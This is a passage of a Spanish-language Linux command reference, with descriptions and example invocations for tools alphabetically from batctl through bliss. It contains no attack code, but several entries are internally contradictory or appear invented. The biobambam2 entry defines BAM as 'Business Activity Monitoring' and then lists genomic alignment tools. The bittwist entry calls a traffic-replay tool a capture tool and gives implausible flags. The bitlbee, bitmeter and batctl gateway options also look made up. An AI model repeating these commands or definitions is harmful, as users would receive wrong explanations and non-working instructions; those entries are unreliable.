   export BAT_THEME="DarkNeon"
   $ source ~/.bashrc


batctl
Herramienta para interactuar con B.A.T.M.A.N [Better Approach To mobile Ad-hoc Networking) protocolo que permite crear redes de malla dinámicas y distribuidas. Antes de usar batctl, se ha de configurar una interfaz de red como parte de la malla:
            # ip link set wlan0 down
            # iwconfig wlan0 mode ad-hoc
            # iwconfig wlan0 essid batman-mesh
            # ip link set wlan0 up
            # batctl if add wlan0
            # ip link set up dev bat0
Nota.- wlan0: interfaz de red configurada en modo ad-hoc y bat0: interfaz virtual que representa la red B.A.T.M.A.N.
# batctl if add eth0 (asocia la interfaz eth0 a la red de malla gestionada por batman-adv)
# batctl if (muestra las interfaces asociadas a batman-adv)
# batctl o (muestra los vecinos y rutas aprendidas dentro de la red de malla)
# batctl ping 02:12:34:56:78:90 (hacer un ping a través de la malla)
# batctl td bat0 (inicia la captura de paquetes en la interfaz bat0)
# batctl n (muestra los nodos vecinos y su calidad de enlace)
# batctl ap 1 (habilitar el modo puente)
# batctl ap 0 (deshabilitar el modo puente)
# batctl gw_mode server 20 (configura el nodo como un gateway con un TTL de 20)
# batctl loglevel 2 (activa un nivel más detallado de registro para depuración)
# batctl tp 02:12:34:56:78:90 (ver estadísticas de origen de paquetes y el rendimiento entre nodos)
# modprobe batman-adv (asegúrar de que el módulo del kernel esté cargado)


bats
Este comando [Bash Automated Testing System] es un marco de pruebas para Bash que permite escribir scripts y generar salidas compatibles con TAP [Test Anything Protocol] para verificar que se comporten como se espera. Bats es más útil cuando se prueba software escrito en Bash, pero puede usarse para probar cualquier programa UNIX.
$ bats script.sh
$ bats -t script.sh (prubea detallada)


bb
demostración audiovisual de arte ascii


bb.sh
Servidor web integramente en bash. Descarga: <https://github.com/cfenollosa/bashblog>. Una vez copiado el script en la carpeta web, normalmente en /var/www o /var/www/html y otorgarle permisos de ejecución [chmod +x bb.sh] y, preferiblemente a partir de archivos markdown, lanzar:
$ ./bb.sh post archivo.md (crear un post en html a partir de un archivo markdown)
$ ./bb.sh edit -f archivo.html (Editar un archivo ya realizado para modificarlo)
$ ./bb.sh rebuild (Actualizar después de una modificación)
$ ./bb.sh list (Listar todos los post)
$ ./bb.sh delete archivo.md (Eliminar archivo)
$ ./bb.sh reset (resetear el site. No elimina los archivos md creados solo lo generado por el script)
Nota.- Caso de tener el blog en el directorio personal, crear enlace simbolico a la carpeta web (ln -s /home/USER/blog /var/wwww/html/)


bbcode
Colección de etiquetas que se usan para cambiar la apariencia del texto en un blog (similar al lenguaje de marcas html). Su forma de uso es [etiqueta-1][etiqueta-2] texto [/etiqueta-1][/etiqueta-2]
	[b]texto[/b] (Negrita)
	[u]texto[/u] (Subrayado)
	[i]texto[/i] (cursiva)
	[color=red]texto[/color] (texto en color rojo. Otros colores: brown, marron, orange, yellow, lime, green, aqua, blue, navy, purple, fuchsia, silver, white, coral...)
	[font="Arial Narrow"]texto[/font] (Emplear la fuente Arial. Otras fuentes: Century, Currier New, Fixed Sys, Georgia, Lucida, Times New Roman, Verdana.. Si se emplean fuentes "exóticas" y el que visiona el texto no la tiene instalada, la etiqueta se pasará por alto. Tambien es mejor entrecomillar el nombre de la fuente i esta contine espacios)
	[url=http://lapipaplena.net]La Pipa Plena[/url] (Enlace a una web)
	[url]http://lapipaplena.net[/url]
	[email]juan@gmail.com[/email] (Enlace a un correo)
	[email=juan@gmail.com]Correo de juan[/email]
	[img]/home/usuario/imagenes/lago.png[/img] (Mostrar una imagen)
	[quote="Frase popular"]A quien madruga Dios le ayuda[/quote] (Cita)
	[quote]A quien madruga Dios le ayuda[/quote] (Cita sin mostrar autor)
	[code]texto[/code] (citar código fuente)


bbe
Editor [Binary Block Editor] como sed, pero para archivos binarios lo que permite realizar modificaciones, inserciones, y reemplazos en bloques de datos.
$ bbe -e 'i 0xABCD' < entrada.bin > salida.bin (inserta los bytes AB CD al inicio del archivo de entrada y lo guasrda en salida.bin
$ bbe -e 's 0x1234 0x5678' < entrada.bin > salida.bin (reemplaza todas las ocurrencias del patrón 12 34 por 56 78)
$ bbe -e 'd 0 10' < entrada.bin > salida.bin (elimina 10 bytes desde el inicio)
$ bbe -e 'c 0xFF 5' < entrada.bin > salida.bin (cambia el byte en la posición 5 por FF)
$ bbe -e 's 0xDEAD 0xBEEF' < entrada.bin | hexdump -C (muestra el archivo modificado en formato hexadecimal.)
$ bbe -e 'p 0xCAFEBABE' < entrada.bin > salida.bin (añade los bytes CA FE BA BE al inicio)
$ bbe -e 'a 0x12345678' < entrada.bin > salida.bin (añade los bytes 12 34 56 78 al final)
$ bbe -e 'c 0xFF 0; c 0xAA 10' < entrada.bin > salida.bin (cambia el byte en la posición 0 a FF y el byte en la posición 10 a AA)
$ bbe -e 'r 0x00 5 10' < entrada.bin > salida.bin (Rellena los 10 bytes comenzando desde la posición 5 con 00)
$ bbe -e 'x 0 5 20' < entrada.bin > salida.bin (copia los 5 primeros bytes al desplazamiento 20)
$ echo "Datos adicionales" | bbe -e 'p 0xCAFEBABE' > salida.bin (modificar un archivo desde stdin)
$ bbe -e 's 0x1111 0x2222' < entrada.bin > temp.bin && mv temp.bin entrada.bin (modificar un archivo directamente y sobrescribirlo)


bbpager
Herramienta que coloca un aplet para intercambiar el area de trabajo. Configuración en el archivo /.bbtools/bbpager.rc


bbrun
Lanzador de aplicaciones propio de fluxbox.


bc
Calculadora
bc -l  (Entra en el promt de la calculadora. Para terminar teclear quit o exit)
$ echo "36*2" | bc
$ echo "(1409302/28186042)*100" | bc -l
$ echo "scale = 6; 13.397/12" | bc (Resultado con 6 decimales)


bcache-tools
Herramienta que permite utilizar unidades SSD como caché para dispositivos de almacenamiento más lentos, como discos duros [HDD], mejorando el rendimiento del sistema.
# make-bcache -C /dev/sdX (formatea el SSD como caché [verificar la unidad SDD con: fdisk -l])
# make-bcache -B /dev/sdY (formatea el dispositivo HDD que será almacenado en caché)
  $ ls /sys/fs/bcache (identifica los UUIDs generados al crear el caché y el backend)
  $ echo <cache-UUID> | sudo tee /sys/block/bcache0/bcache/attach (conectar el caché al backend)
# echo writethrough | sudo tee /sys/block/bcache0/bcache/cache_mode (escribe en caché y backend simultáneamente.)
Nota.- Otras opciones: Writeback: Escribe primero en caché, luego en el backend y Writearound: Escribe directamente en el backend.
# mount /dev/bcache0 /mnt (montar el dispositivo bcache)
# bcache-super-show /dev/sdX (comprobar rendimiento o estadísticas del caché)
# echo 1 | sudo tee /sys/block/bcache0/bcache/detach (desconectar un dispositivo de caché)
# ls /sys/fs/bcache/ (listar dispositivos gestionados por bcache)
# echo 1 | tee /sys/block/bcache0/bcache/stop (detener el caché)
# wipefs -a /dev/sdX (borrar el superblock)
$ make-bcache --help (explorar más comandos y opciones)
$ bcache-super-show --help (explorar más comandos y opciones)


bcal
Herramienta utilizada para realizar cálculos relacionados con bits, bytes y direcciones.
$ bcal 1024 b (convertirá 1024 bytes a otras unidades de almacenamiento, mostrando el resultado en kilobytes, megabytes, etc.)
$ bacl 1024 giH


bcd
Formatea un texto en forma de tarjeta perforada.
$ bcd linux es genial


bcftools
Conjunto de utilidades que manipulan las llamadas de variantes en Variant Call Format [VCF] y su contraparte binaria BCF.
$ bcftools view -r ch1:100000-200000 input.vcf.gz > output.vcf (extrae las variantes en la región del cromosoma 1 entre las posiciones 100000 y 200000)
$ bcftools view -i "QUAL > 30 && DP > 10" input.vcf.gz > output.vcf (filtra las variantes con calidad superior a 30 y profundidad de mapeo mayr a 10)
$ bcftools query -f '%POS\n' input.vcf.gz | wc -l (extrae solo las posiciones y cuenta el número de líneas, lo que equivale al número de variantes)
$ bcftools query -f '%INFO/AF\n' input.vcf.gz > af_info.txt (extrae la frecuencia alélica [AF] de los campos INFO y la guarda en un archivo separado
$ bcftools view -a 'T' input.vcf.gz > output.vcf (filtra las variantes donde el alelo alternativo es 'T')
$ bcftools view -i "(DP > 50 || QUAL > 40) && (AF > 0.05)" input.vcf.gz > output.vcf (filtra variantes con profundidad de mapeo superir a 50 o calidad superior a 40, y frecuencia alélica mayor a 0.05)


bd
Sustituye los clásicos cd ../../.. para ir varios directorios atras en la misma ruta por una forma más simple y solo colocando las primeras letras del directorio al que queremos ir..
$ cd /Documentos/linux/emacs/org/presentaciones/css
@Deb:~/Documentos/linux/emacs/org/presentaciones/css > bd e
@Deb:~/Documentos/linux/emacs/ > bd D
@Deb:~/Documentos/ >
Nota.- Precisa algunos ajustes en configuración del sistema:
$ echo 'alias bd=". bd -si"' >> ~/.bashrc
$ source .bashrc
# wget -O /etc/bash_completion.d/bd https://raw.github.com/vigneshwaranr/bd/master/bash_completion.d/bd
# source /etc/bash_completion.d/bd


bchunk
Convierte una imagen de CD en formato .bin/.cue o, a veces .raw/.cue en un conjunto de pistas .iso y .cdr/.wav. El formato .bin/.cue lo utilizan algunos programas de escritura de CD que no son UNIX, pero no es compatible con la mayoría de los demás programas de escritura de CD.
$ bchunk -v imagen.bin imagen.cue salida (creará un archivo iso llamado "salida.iso" con los datos del disco y modo verbose)
$ bchunk -w imagen.bin imagen.cue salida (con el audio en formato WAV


beep
Pitidos del altavoz
# beep
# beep -f 440 -l 1000 (Sonando un La durante 1000 milisegundos)
# beep -r 5 -d 1000 (5 pitidos separados entre ellos por 1000 milisegundos de silencio)
# beep -f 1000 -n -f 2000 -n -f 1500 ("-n" permite introducir nuevos parámetros)
# cat /etc/apt/sources.list | beep -c -f 311 -D 50 -l 10  (Emitirá un pitido despues de cada caracter[-c])
Notas:
Frecuencias de la escala musical (-f):
	Do > 261
	Do# > 277
	Re > 293
	Re# > 311
	Mi > 329
	Fa > 349
	Fa# > 369
	Sol > 392
	Sol# > 415
	La > 440
	La# > 466
	Si > 493
Si beep no emite sonidos, puede que el dispositivo esté en la lista negra:
# nano /etc/modprobe.d/blacklist (Comprobar si existen alguna linea: blacklist pcspkr o  blacklist snd_pcsp)
# lsmod | grep pcsp  (Otra forma de comprobar si existe como módulo)
# modprobe pcspkr  (para cargarlo)
# modprobe -r pcspkr  (Para eliminarlo nuevamente)
# rmmod pcspkr  (Otra forma de quitar el módulo)


bfbtester
Realizar comprobaciones de seguridad rápidas y proactivas de programas binarios. BFBTester realizará comprobaciones de desbordamientos de línea y múltiples, así como desbordamientos de variables de entorno. También puede observar la actividad de creación de archivos temporales para alertar al usuario sobre cualquier programa que utilice nombres de archivos temporales no seguros. Si bien no puede probar todos los desbordamientos en el software, es útil para detectar errores iniciales que pueden alertar sobre software peligroso.
$ bfbtester -a /home/user/bin/* (todas las comprobaciones de los scripts del directorio mencionado en el home del usuario)


bg
Pasa un proceso a segundo plano.
$ bg PID
$ bg %3 (mover el proceso 3 a background)


biew
[beye]. Comando ncurses para ver y editar ficheros en modo assembler, binario, hexadecimal o modo texto. Es capaz de abrir cualquier archivo, ya sea un fichero de texto o un binario.
$ biew archivo
Para seleccionar el modo de visualización hay que pulsar la tecla F2.
Para realizar búsquedas hay que pulsar la tecla F7
Con la tecla F5 podemos ir a una linea en concreto o si cambiamos el modo, podemos indicar el % al que queremos ir (esto es especialmente útil si deseamos ir al principio o al final del fichero si este es enorme)


big-cursor
Proporciona cursores de mouse grandes para usar en X. Es útil para usuarios de computadoras portátiles, para aquellos que ejecutan X en resoluciones muy altas y para cualquiera a quien le resulte difícil ver los cursores predeterminados del mouse.


bin2iso
Convierte una imagen bin/cue a iso
$ bin2iso imagen.cue  imagen.iso


binclock
Reloj en formato binario para la consola.
$ binclock
$ binclock -l -t (En formato tradicional [hora, minuto, segundo] y actualizando cada segundo)
$ binclock -l -n (Añadiendo la hora en formato humano)


bind
Para probar combinaciones de teclas que no queremos almacenar de forma permanente en el archivo .inputrc (ver)
$ bind "\"\C-x\C-g\": dump-functions" (asignará las teclas Ctrl+x Ctrl+g para ver las funciones readline)
$ bind -P (listado de asignación de teclas de cada función readline)
$ bind -l (Otra forma de ver el listado)
$ bind -p (Otra forma)
$ bind -x "\"\C-l\": ls -la" (asignar combinaciones de teclas que ejecutan comandos. ls -la al pulsar Ctrl+l)


bindechexascii
Comvertir el número entrado como argumento a distintos formatos y viceversa [binario a decimal, binario a hexadecimal, binario a ASCII, decimal a binario...]
$ bindechexascii --d2b 2020 (convierte el num indicado a binario)
$ bindechexascii --d2h 2020 (lo convierte a hexadecimal)
$ bindechexascii --b2d 11111100100 (convierte el num binario a decimal)


bindfs
Herramienta basada en FUSE que permite montar un directorio en otro con opciones específicas, como cambiar permisos, usuarios, grupos o comportamientos del sistema de archivos. Es muy útil para gestionar permisos sin alterar los originales o para configurar accesos específicos.
$ bindfs ~/Documentos /mnt/docs (montar un directorio en otro)
$ bindfs --owner=USER ~/Documentos /mnt/docs (cambia el propietario de los archivos en el punto de montaje. Esto no afecta los archivos originales, solo los reflejados)
$ bindfs --group=grupo ~/Documentos /mnt/docs (simular que los archivos pertenecen a un grupo específico como el caso anterior)
$ bindfs --perms=a-w ~/Documentos /mnt/docs (montar un directorio como solo lectura)
$ bindfs --perms=644 ~/Documentos /mnt/docs (cambiar los permisos reflejados)
$ bindfs --uid=1000 --gid=1000 ~/Documentos /mnt/docs (simular que los archivos tienen un usuario y grupo específicos)
$ bindfs --force-user=otro_usuario ~/Documentos /mnt/docs (que todos los accesos sean tratados como si vinieran de otro_usuario)
$ bindfs --create-with-perms=775 --create-with-group=grupo ~/Documentos /mnt/docs (que los nuevos archivos tengan permisos 775 y pertenezcan al grupo grupo)
$ bindfs --hide-files='*.log' ~/Documentos /mnt/docs (montar un directorio y ocultar archivos .log)
$ bindfs --force-group=grupo --mirror-only=usuario1,usuario2 ~/Documentos /mnt/docs (limitar accesos a los reflejados solo a ciertos usuarios del grupo)
$ fusermount -u /mnt/docs (desmontar el sistema de archivos)
$ mount | grep bindfs (verificar información sobre el montaje)
1.- Para montar un directorio automáticamente al iniciar:
# nano /etc/fstab
Y añadir la linea:
  bindfs#/home/USER/Documentos /mnt/docs fuse defaults 0 0
Con esta linea tambien puede montarse con:
# mount /mnt/docs


bing
Herramienta de medición de ancho de banda entre dos puntos en una red utilizando el comportamiento de paquetes ICMP, similar a ping. Bing determina el rendimiento real, en bruto, en contraposición al disponible o promedio en un enlace midiendo los tiempos de ida y vuelta de las solicitudes de eco ICMP para diferentes tamaños de paquetes en cada extremo del enlace. Puede no ser completamente preciso debido a la latencia de red y el tráfico concurrente.
# bing host1 host2 (envía paquetes de diferentes tamaños entre los dos hosts y estima el ancho de banda)
# bing -s 56 host1 host2 (con un tamaño inicial de 56 bytes para los paquetes ICMP)
# bing -c 20 host1 host2 (realiza 20 pruebas por tamaño. Por defecto 10)
# bing -v host1 host2 (proporciona más detalles sobre cada paquete y cálculo)
# bing -4 host1 host2 (especificar la versión de IP que se debe usar, -6 para IPv6)
# bing -m 8 host1 host2 (limita la diferencia entre los tamaños de paquetes probados a 8 bytes)
# bing -l 64 -u 1500 host1 host2 (tamaño mínimo de los paquetes como 64 bytes y tamaño máximo como 1500 bytes)
# bing -p 5 host1 host2 (envía solo 5 paquetes por prueba)
# bing -f host1 host2 (evita que los paquetes se fragmenten)


bing-ip2hosts
Buscar sitios web alojados en una dirección IP específica o en un nombre de host. Descarga de <http://www.morningstarsecurity.com/research/bing-ip2hosts>
$ ./bing-ip2hosts -n microsoft.com (Sin mostrar el progreso [n])
	www.answers.microsoft.com
	www.microsoft.com
	www.msdn.microsoft.com
	www.research.microsoft.com
$ ./bing-ip2hosts -n -i microsoft.com (Mostrando la ip [i])
	64.4.11.37,msdn.microsoft.com
	64.4.11.37,www.answers.microsoft.com
	64.4.11.37,www.microsoft.com
	64.4.11.37,www.msdn.microsoft.com
	64.4.11.37,www.research.microsoft.com
$ ./bing-ip2hosts -n -i -p microsoft.com (Anteponiendo al nombre de host http:// [p])
	64.4.11.37,http://msdn.microsoft.com
	64.4.11.37,http://www.answers.microsoft.com
	64.4.11.37,http://www.microsoft.com
	64.4.11.37,http://www.msdn.microsoft.com
	64.4.11.37,http://www.research.microsoft.com


binstats
Muestra estadisticas sobre programas y bibliotecas.
$ binstats -manuals=/usr/man (sobre páginas man)
$ binstats -binary=/usr/bin (de binarios)
$ binstats -file=bstats.log (de un archivo)
$ binstats -temp=/tmp (de un directorio)


binutils
Los programas en este paquete se utilizan para ensamblar, vincular y manipular archivos binarios y de objeto. Pueden ser utilizados en conjunto con un compilador y varias bibliotecas para construir programas. Consta de la siguientes aplicaciones: addr2line, ar, as, c++filt, dwp, elfedit, gold, gprof, ld, ld.bfd, ld.gold, nm, objcopy, objdump, ranlib, readelf, size, strings y strip


binwalk
Herramienta para buscar archivos incrustados y código ejecutable en una imagen binaria determinada. Específicamente, está diseñada para identificar archivos y código incrustados dentro de imágenes de firmware.
# binwalk archivo.bin (mostrará cualquier patrón o estructura conocida encontrado en el archivo)
# binwalk -e archivo.bin (extraer automáticamente todos los archivos conocidos dentro de un archivo binario)
# binwalk --extract --directory /codigos/incrustados archivo.bin (especificando un directorio de salida para los archivos extraídos)
# binwalk --entropy archivo.bin (calcular y visualizar la entropía del archivo que puede ayudar a detectar datos comprimidos)
# binwalk --signature --opcodes archivo.bin (análisis de firmas y opcodes)
# binwalk --dd 'png image:png' archivo.bin (escanear solo por ciertas firmas específicas)


biobambam2
BAM [Business Activity Monitoring] es un conjunto de software y aplicaciones tecnológicas e informáticas que permiten monitorizar las actividades de negocio y los procesos de una organización ofreciendo principalmente resúmenes, reportes e informes en tiempo real del conjunto de las operaciones que se llevan a cabo. Consta de varios comandos: bamsormadup [ordenamiento paralelo y marcado de duplicados], bamcollate2 [lee BAM y escribe BAM reordenado de forma que se alinee o se intercale por nombre de consulta], bammarkduplicates [lee BAM y escribe BAM con alineaciones duplicadas marcadas utilizando el campo de indicadores BAM], bammaskflags [lee BAM y escribe BAM mientras enmascara (elimina) bits de la columna de indicadores], bamrecompress [lee BAM y escribe BAM con una configuración de compresión definida. Esta herramienta es capaz de realizar subprocesos múltiples], bamsort [lee BAM y escribe BAM ordenado por coordenadas o nombre de consulta] y bamtofastq [lee BAM y escribe FastQ; la salida se puede intercalar o desintercalar por nombre de consulta] y varios más. Las opciones se pasan como pares key=value y muchos programas tienen dos modos de operación, por ejemplo, SO=coordinate vs SO=queryname.
$ bamsort -h (obtener ayuda específica sobre un comando)
$ bamsort input.bam output.bam
$ bamsormadup SO=coordinate threads=4 input.bam output.bam
$ bamsormadup SO=coordinate threads=8 input.cram output.bam (procesar archivos CRAM)
$ blastnxmltobam ref.fasta query.fasta > query.bam (convertir XML a BAM)


biosdecode
Analiza la memoria de la BIOS e imprime información sobre todas las estructuras que conoce.
# biosdecode


bip
Proxy IRC que permite reproducir conversaciones registradas cuando un cliente se conecta a varios clientes en una conexión de servidor IRC.
# /etc/init.d/bip start (iniciar el servicio)
# bipgenconfig (generar configuración automáticamente)
# bipmkpw USER (crear un usuario y contraseña. Copiar la salida hashada y pegarla en el archivo bip.conf)
# openssl req -new -newkey rsa:4096 -nodes -x509 -keyout bip.pem -out bip.pem (generar un certificado SSL, opcional pero recomendado)
Mover el certificado a /var/lib/bip y ajustar permisos:
      # mv bip.pem /var/lib/bip
      # chown bip:bip /var/lib/bip/bip.pem
      # chmod 600 /var/lib/bip/bip.pem
      # /etc/init.d/bip start (iniciar bip con)
Los clientes deben conectarse al puerto especificado en bip.conf, por defecto 7778, usando la siguiente estructura de contraseña:
    nombre_usuario:contraseña_hashada:nombre_conexión
Donde "nombre_conexión" corresponde al nombre definido en la sección "connection" del archivo bip.conf.


bird
Demonio de enrutamiento de Internet con soporte completo para todos los principales protocolos.
$ birdc (abre una sesión interactiva con el cliente remoto de BIRD)
  birdc> show status (muestra la versión de BIRD, tiempo de ejecución y última actualización)
  birdc> show interfaces (muestra una lista de interfaces con sus estados y configuraciones)
  birdc> show protocols (muestra los protocolos activados y su estado)
  birdc> show route (muestra el contenido de las tablas de rutas, incluyendo destinos, próximos saltos y protocolos)
  birdc> show ospf state (muestra información detallada sobre el estado del protocolo OSPF)
  birdc> show bfd sessions (información sobre las sesiones BFD activas)
  birdc> show route filter (información sobre los filtros de rutas definidos)
  birdc> enable bgp1 (activa o desactiva un protocolo específico)
  birdc> show route stats (estadísticas detalladas sobre las rutas, como número de redes y rutas antes/después del filtrado)


birthday
Dada una lista de las fechas de varios eventos diferentes, calcula y muestra una lista de aquellos que se realizarán en las próximas semanas. Esto fue diseñado originalmente para cumpleaños, pero también se puede usar para recordatorios sobre eventos anuales o para un diario de actividades. El archivo de datos:
$ nano ~/.birthdays
Con un contenido de ejemplo:
    Navidad=25/12/2024 ev
    Juan Perez=07/10/2024 bd
    Fiesta del trabajo=01/05/2024 ann
Nota.- "ev" = evento, "ann" = aniversario y "bd" = cumpleaños (por defecto)
$ birthday -w (muestra los dias que faltan para los acontecimientos de los proximos 21 dias - Por defecto)
$ birthday -W 5 (muestra los acontecimientos de los proximos 5 dias)
$ birthday -c (muestra el calendario)
$ birthday -L (muestra el dia y el mes despues de los dias que faltan


bitlbee
Este programa se puede utilizar como un servidor IRC que reenvía todo lo que dices a personas en otras redes de chat: Jabber (que incluye Google Talk) y Twitter. Precisa configurar los usuarios permitidos y posiblemente establecer contraseñas.
# systemctl start bitlbee (que esté ejecutando el servicio)
# systemctl enable bitlbe
$ bitlbee -c juan_perez (conectar con un usuario desde el cliente IRC. Para desconectar, presiona Ctrl+c)
$ bitlbee -l (ver los usuarios conectados y sus estados)
$ bitlbee -m juan_perez Hola, cómo estás? (enviar un mensaje a un usuario conectado)
$ bitlbee -k (ver los canales si Hay configurado alguno)
$ bitlbee -d juan_perez (desconectar un usuario específico)


bitmap
Editor de mapas de bits y utilidades de conversión para el sistema X Window. El mapa de bits puede especificarse como una lista de datos o una cadena de texto que se convierte en un mapa de bits.


bitmeter
Herramienta diseñada para diagnosticar problemas en configuraciones de audio que utilizan el servidor JACK. Ayuda a verificar si las conexiones de audio están funcionando correctamente y detectar posibles errores o distorsiones en las señales de audio.
$ jackd -d alsa (el servidor JACK tiene que estar activo)
$ bitmeter (arrancar la aplicación con el servidor JACK activo y detectará automáticamente las conexiones JACK y comenzará a monitorear señales de audio)
$ bitmeter -p system:playback_1 (monitorea el puerto de salida de audio playback_1)
$ bitmeter -r 16 (cambiar el rango de bits que se muestran en la salida a 16)
$ bitmeter -v (muestra información detallada)
$ bitmeter -a (analiza automáticamente todas las conexiones disponibles y todos los puertos que están conectados al servidor)
$ bitmeter --noise (genera ruido blanco para verificar la integridad de las conexiones)
$ bitmeter --duration 30 (finaliza el monitoreo automáticamente después de 30 segundos)
$ bitmeter > resultados_diagnostico.txt (guardar la salida de bitmeter en un archivo)
$ bitmeter -p system:capture_1 (monitorea la señal del puerto de entrada capture_1)
$ killall bitmeter (parar la aplicación. También con Ctrl+c)


bittwist
Está diseñado para complementar a tcpdump, que por sí solo ha hecho un gran trabajo en la captura de tráfico de red. Bit-Twist puede regenerar el tráfico capturado en una red activa, los paquetes se generan a partir del archivo de seguimiento de tcpdump, generando un archivo .pcap.
# bittwist -i eth0 (capturar todo el tráfico en la interfaz eth0 en modo promiscuo)
# bittwist -i eth0 -n 'ip' (capturar solo el tráfico IPv4)
# bittwist -i eth0 -n 'http' (capturar solo el tráfico HTTP)
# bittwist -i eth0 -t '2023-03-15 10:00:00' -T '2023-03-15 11:00:00' (capturar durante un período específico)
# bittwist -i eth0 -f 'len >= 1024' (capturar solo paquetes con un cierto tamaño)
# bittwist -i eth0 -h (mostrar solo los encabezados de los paquetes)
# bittwist -i eth0 -w capture.pcap (guardar la captura en un archivo)
# bittwist -r captue.pcap (leer una captura existente y mostrarla)


bitwise
es una calculadora interactiva de múltiples bases que admite la conversión de bases dinámicas y la manipulación de bits. Es una herramienta útil para hackers de bajo nivel, desarrolladores de kernel y desarrolladores de controladores de dispositivos. Algunas de las características incluyen: Interfaz interactiva de ncurses, Calculadora de línea de comandos, Manipulador de bits individual y Operaciones bit a bit como NOT, OR, AND, XOR y desplazamientos.
$ bitwise (abrirá una interfaz interactiva donde se podrá ingresar números y realizar operaciones)
$ bitwise 12345 (convertirá el número decimal 12345 a diferentes bases binaria, octal y hexadecimal)
$ bitwise 0x563d (convertirá el número hexadecimal 0x563d a sus representaciones decimal, binaria y octal)
$ bitwise "0x123 + 0x20 - 30 / 50" (evaluará la expresión matemática en hexadecimal y mostrará el resultado)
$ bitwise &0x1 > 0 (verificar si un número es par o impar)


bld
Es un demonio que escucha las peticiones en el puerto 2905 y recoge la información cada 10 segundos escribiendo los resultados en un archivo RRD. Las estadísticas recopiladas incluyen: Uso de CPU y memoria, carga del sistema, latencia de la red (ping), tráfico de la interfaz de la red, y temperaturas del sistema (usando sensores lm), y uso del disco. Las peticiones son o bien presentaciones de direcciones IP o comprobaciones con la lista negra. bld utiliza un algoritmo muy simple para decidir si agregar o no las direcciones IP a la lista negra. La primera vez que una dirección IP es enviada, se agrega a una lista interna con una marca de tiempo y todas las solicitudes posteriores incrementan un contador para esta IP. Tan pronto como el intervalo de tiempo mínimo es transcurrido (por defecto: 30 segundos), y si se alcanza un ratio máximo de solicitudes (por defecto: 10 envíos en el intervalo de 30 segundos), la IP es puesta en la lista negra. A continuación se pone en la lista negra durante un tiempo configurable (por defecto: 900 segundos).
# /etc/init.d/bld stop (parar el demonio)
# bld -u root (indicar el usuario de bld)
# bld -a localhost (indicar el host de escucha)
# bld -p 2905 (indicar el puerto de escucha)
# bld -P /root/bld (indicar el archivo donde guardar el PID)
# bld -B /root/bld_lista_negra (donde guardar la lista negra)
# bld -I /root/bld_lista_ips (donde guardar la lista de ips)
# bld -W /root/bld_lista_blanca (donde guardar la lista blanca de ips)
# /etc/init.d/bld force-reload (reiniciar el demonio con todo lo especificado)
Otros comando relacionados y del mismo paquete o bld-tools:
# bldread /root/bld_lista_negra (leer informes si existen)
# bld-mrtg (lee los archivos de volcado del demonio e imprime estadísticas sobre la cantidad de IP actualmente en la lista negra y la cantidad de IP agregadas en los últimos 5 minutos)
# blddecr localhost:10000 192.168.1.58 (disminuye el contador de una dirección IP en un host y un puerto determinado. Por defecto localhost:2905)
# bldinsert localhost:10000 192.168.1.104 (Agrega una ip a la lista negra en un host concreto y un puerto determinado. Por defecto localhost:2905)
# bldquery localhost:10000 192.168.1.39 (pregunta al demonio que escucha en determinado host y puerto si una ip está en la lista negra por defecto localhost:2905)
# bldsubmit localhost:10000 192.168.1.46 (envía una ip al demonio que escucha en el host y puerto determinado (por defecto en localhost:2905)


bleachbit
elimina archivos innecesarios para liberar espacio valioso en el disco, mantener la privacidad y eliminar archivos basura. Elimina la memoria caché, el historial de Internet, los archivos temporales, las cookies y los accesos directos rotos. Se encarga de la limpieza de Adobe Reader, Bash, Beagle, Epiphany, Firefox, Flash, GIMP, Google Earth, Java, KDE, OpenOffice.org, Opera, RealPlayer, rpmbuild, Second Life Viewer, VIM, XChat y más. Además de simplemente borrar archivos basura, BleachBit limpia el espacio libre en el disco (para ocultar archivos eliminados previamente para mayor privacidad y para mejorar la compresión de imágenes), limpia las bases de datos de Firefox (para mejorar el rendimiento sin eliminar datos) y destruye de forma segura archivos arbitrarios.
$ bleachbit (uso básico pero no recomendable)
$ bleachbit --list (opciones disponibles)
$ bleachbit --cleaner=browser-cache (limpiar caché de navegadores)
$ bleachbit --preview firefox.cache (previsualizar qué se eliminará sin eliminarlo)
$ bleachbit --clean firefox.cache (eliminar los archivos del comando anterior)
$ bleachbit --cleaner=system-files (eliminar archivos temporales)
$ bleachbit --shrink (liberar espacio en disco)
$ bleachbit --delete-large-files (eliminar archivos grandes)
$ bleachbit --cleaner=application-configurations (limpiar configuraciones de aplicaciones)
$ bleachbit --cleaner=duplicate-files (eliminar archivos duplicados)
$ bleachbit --preview firefox.cache opera.cache (combinar varias opciones. Previsualizar lo que se limpiará de la cache de firefox y opera)
$ bleachbit --clean firefox.config (limpiar las configuraciones de una aplicación específica)
$ bleachbit --overwrite --clean firefox.cache (sobrescribir los contenidos de los archivos eliminados para evitar su recuperación)
Usar "--preview" antes de "--clean" para asegurarse de qué se eliminará. Algunas de las opciones pueden requerir permisos de administrador.


bliss
Herramienta para calcular grupos de automorfismos y formas canónicas de grafos.
$ bliss grafo.bliss -v (calculará el grupo de automorfismos del grafo y la forma canónica y mostrará el resultado con información detallada por pantalla)
$ bliss grafo.bliss -p (ordena los nodos del grafo de acuerdo con el grado de cada uno)
$ bliss grafo.bliss -o grafo.dot (genera un archivo de salida llamado grafo.dot en formato compatible con Graphviz)
$ time bliss grafo.bliss (ejecutará el comando y mostrará cuánto tiempo tomó calcular los automorfismos)
1.- Comparar dos grafos verificando si son isomorfos. Por ejemplo:
$ bliss grafo1.bliss -c > canon1.txt
$ bliss grafo2.bliss -c > canon2.txt
$ diff canon1.txt canon2.txt
Si las formas canónicas de los dos grafos son iguales, el resultado será un archivo vacío, indicando que los grafos son isomorfos.
2.- Ejemplo completo para la creación de grafos en formato DIMACS:
$ echo -e "p edge 6 5\ne 1 2\ne 1 3\ne 2 4\ne 2 5\ne 3 6" > grafo.dimacs
$ cat grafo.dimacs
    p edge 6 5
    e 1 2
    e 1 3
    e 2 4
    e 2 5
    e 3 6
La línea "p edge 6 5" indica que hay 6 vértices y 5 aristas. Cada línea que comienza con "e" describe una arista entre dos vértices numerados a partir de 1.
$ bliss grafo.dimacs
    Generator: (4,5)
    Nodes:          3
    Leaf nodes:     3
    Bad nodes:      0
    Canrep updates: 1
    Generators:     1
    Max level:      1
    |Aut|:          2
    Total time:	0.00 seconds
Verificar que grafo.dimacs no ha variado:
$ cat -A grafo.dimacs
    p edge 6 5
    e 1 2
    e 1 3
    e 2 4
    e 2 5
    e 3 6
